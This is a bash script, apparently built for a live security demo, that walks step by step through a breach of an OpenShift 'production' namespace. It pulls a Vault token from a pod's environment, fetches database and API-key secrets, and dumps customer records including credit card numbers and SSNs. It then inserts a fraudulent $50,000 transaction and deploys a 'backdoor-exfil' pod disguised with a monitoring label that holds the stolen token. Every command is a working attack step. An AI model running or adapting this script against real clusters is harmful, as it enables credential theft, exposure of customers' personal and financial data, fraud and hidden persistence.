#!/bin/bash
# Interactive Attack Demo - Pure Terminal Session
# Blank prompt -> press Enter -> command appears -> executes

set -e

run_cmd() {
    local cmd="$1"
    echo -n "\$ "
    read -s
    echo "$cmd"
    eval "$cmd"
    echo ""
}

clear

cat << 'EOF'
================================================================================
          PRODUCTION DATABASE BREACH - Live OpenShift Cluster
================================================================================

EOF

read -s

run_cmd "oc get pods -n production"

run_cmd "oc get deployment payment-processor -n production"

POD=$(oc get pod -n production -l app=payment-processor -o jsonpath='{.items[0].metadata.name}')

run_cmd "export POD=$POD"

run_cmd "echo \"Target pod: \$POD\""

run_cmd "oc exec -n production \$POD -- printenv | grep -i vault"

run_cmd "oc exec -n production \$POD -- sh -c 'curl -sf -H \"X-Vault-Token: \$VAULT_TOKEN\" \$VAULT_ADDR/v1/secret/data/database/production | jq .data.data'"

run_cmd "oc exec -n production \$POD -- sh -c 'curl -sf -H \"X-Vault-Token: \$VAULT_TOKEN\" \$VAULT_ADDR/v1/secret/data/api-keys/production | jq .data.data'"

run_cmd "oc exec -n production \$POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c '\\dt'"

run_cmd "oc exec -n production \$POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c 'SELECT COUNT(*) as total_customers FROM customers;'"

run_cmd "oc exec -n production \$POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c 'SELECT customer_name, email, account_balance, credit_card, ssn FROM customers ORDER BY account_balance DESC LIMIT 5;'"

run_cmd "oc exec -n production \$POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -t -c 'SELECT SUM(account_balance) as total_at_risk FROM customers;' | xargs echo 'Total at risk: \$'"

run_cmd "oc exec -n production \$POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"INSERT INTO transactions (customer_id, amount, transaction_type, description) VALUES (1, -50000.00, 'withdrawal', 'UNAUTHORIZED - Attacker controlled transfer') RETURNING *;\""

run_cmd "oc exec -n production \$POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c 'SELECT * FROM transactions ORDER BY created_at DESC LIMIT 3;'"

VAULT_TOKEN=$(oc exec -n production $POD -- printenv VAULT_TOKEN)

cat <<EOFYAML > /tmp/backdoor.yaml
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-exfil
  namespace: production
  labels:
    app: monitoring
spec:
  containers:
  - name: exfil
    image: registry.access.redhat.com/ubi9/ubi-minimal:latest
    command: ["/bin/bash", "-c"]
    args:
    - |
      echo "Backdoor active - continuous data exfiltration"
      while true; do
        echo "[\$(date)] Exfiltrating to attacker C2..."
        sleep 300
      done
    env:
    - name: STOLEN_VAULT_TOKEN
      value: "$VAULT_TOKEN"
    - name: DB_HOST
      value: customer-database.production.svc.cluster.local
EOFYAML

run_cmd "oc apply -f /tmp/backdoor.yaml"

run_cmd "oc get pod backdoor-exfil -n production"

echo ""
echo "================================================================================"
echo ""
echo "Attack complete:"
echo ""
echo "  - Vault token stolen (90-day validity)"
echo "  - Database credentials compromised"
echo "  - API keys stolen (Stripe, AWS, SendGrid)"
echo "  - Customer data exfiltrated (10 records, \$1.2M+)"
echo "  - Fraudulent transaction created (\$50,000)"
echo "  - Backdoor deployed for persistence"
echo ""
echo "================================================================================"
echo ""
